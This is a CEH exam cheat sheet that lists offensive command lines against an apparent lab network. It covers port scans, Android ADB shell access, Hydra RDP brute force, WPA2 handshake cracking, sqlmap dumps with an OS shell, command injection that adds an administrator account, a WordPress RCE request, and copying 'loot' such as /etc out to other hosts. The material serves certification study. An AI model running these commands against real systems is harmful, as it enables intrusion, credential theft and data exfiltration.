# 🛠 CEH Exam Cheat Sheet

## 📑 Table of Contents
- [Quick Reference](#-quick-reference)
- [Nmap Scans](#-nmap-scans)
- [Android (ADB / Phonesploit)](#-android-adb--phonesploit)
- [RDP](#-rdp)
- [SMB & Drive Mapping](#-smb--drive-mapping-parrotos)
- [Wireshark](#-wireshark)
- [Wireless Cracking](#-wireless-cracking)
- [SQLMap](#-sqlmap)
- [DVWA](#-dvwa)
- [Linux Privilege Escalation](#-linux-privilege-escalation)
- [ELF & DIE](#-elf--die)
- [Steganography](#-steganography)
- [OpenVAS](#-openvas)
- [WordPress](#-wordpress)
- [File Transfer](#-file-transfer)
- [VeraCrypt](#-veracrypt)
- [Key Ports](#-key-ports)

---

## 🔑 Quick Reference


---

## 🔍 Nmap Scans
```bash
# Stealth SYN scan
nmap -sS -v [Target IP]

# Xmas scan
nmap -sX -v [Target IP]

# Maimon scan
nmap -sM -v [Target IP]

# ACK scan (no response = filtered/firewall)
nmap -sA -v [Target IP]

# UDP scan
nmap -sU -v [Target IP]

# NULL scan
nmap -sN -T4 -A -v [Target IP]

# MySQL default port
nmap -p 3306 10.10.1.0/24

# Full range with service versions
nmap -sV -p 0-65535 10.10.1.19

# LDAP / DNS CN
nmap -p 389 10.10.1.0/24
nmap -A 10.10.1.22

python3 -m pip install colorama
python3 phonesploitpro.py
nmap -p 5555 10.10.1.0/24

# Connect to device
phonesploit 10.10.1.14
get shell
cd /sdcard/Downloads
ls
pull /sdcard/Downloads

# Scan RDP
nmap -p 3389 10.10.1.0/24

# Hydra brute force
hydra -L Usernames.txt -P Passwords.txt 10.10.1.11 rdp

# Alternate hydra syntax
hydra -l Administrator -P passwords.txt rdp://10.10.1.11 -t 4 -f -V

smbclient \\\\10.10.1.11\\CEH-Tools -U username

Statistics → Conversations → IPv4 → Sort by Packets

# With password list
aircrack-ng -w password.txt W!F!_Pcap.cap

# WPA2 handshake crack
aircrack-ng handshake.cap -w rockyou.txt
aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie]" --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie]" -D moviescope --tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie]" -D moviescope -T User_Login --dump
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie]" -D moviescope -T User_Login --os-shell

# Recursive crawl & dump to CSV
sqlmap -u "http://www.moviescope.com" --crawl=2 --dump-format=CSV --dump

URL: http://10.10.1.22:8080/DVWA
Username: admin
Password: password

# Commands
| dir c:\wamp64\www\DVWA\
| type c:\wamp64\www\DVWA\file.txt
| tasklist
| whoami
| taskkill /PID [Process ID] /F
| net user Test /Add
| net localgroup Administrators Test /Add

nmap -p 22 10.10.1.0/24
ssh ubuntu@10.10.1.9
Password: toor
cd /
cat [sensitive file]

# Encode
snow -C -m "base64 encoded output" -p "password" restricted.txt restricted2.txt

# Decode
snow -C -p "password" restricted2.txt

CyberChef

Encode/decode base64 online: https://gchq.github.io/CyberChef/

Online Tools

CrackStation: https://crackstation.net

StegOnline: https://stegonline.georgeom.net/upload

docker run -d -p 443:443 --name openvas mikesplain/openvas
URL: https://127.0.0.1

wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token]

# Exploit example
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'

# FTP recursive download
wget -m ftp://user:pass@host/remotefolder/

# With lftp
lftp ftp://user:pass@victim-ip
mirror /etc configs_backup

# SCP
scp -r ./loot/192.168.1.50/Camera YourWinUser@192.168.1.20:/Users/YourWinUser/Desktop/loot/

# Mount Windows share
sudo apt install -y cifs-utils
sudo mkdir -p /mnt/winshare
sudo mount -t cifs //192.168.1.20/dropbox /mnt/winshare -o username=YourWinUser,domain=WORKGROUP
cp -r ./loot/192.168.1.50/Camera /mnt/winshare/
sudo umount /mnt/winshare

Key Ports

389 → Domain Controller (LDAP)

3306 → MySQL

3389 → RDP / RAT

5555 → Android ADB
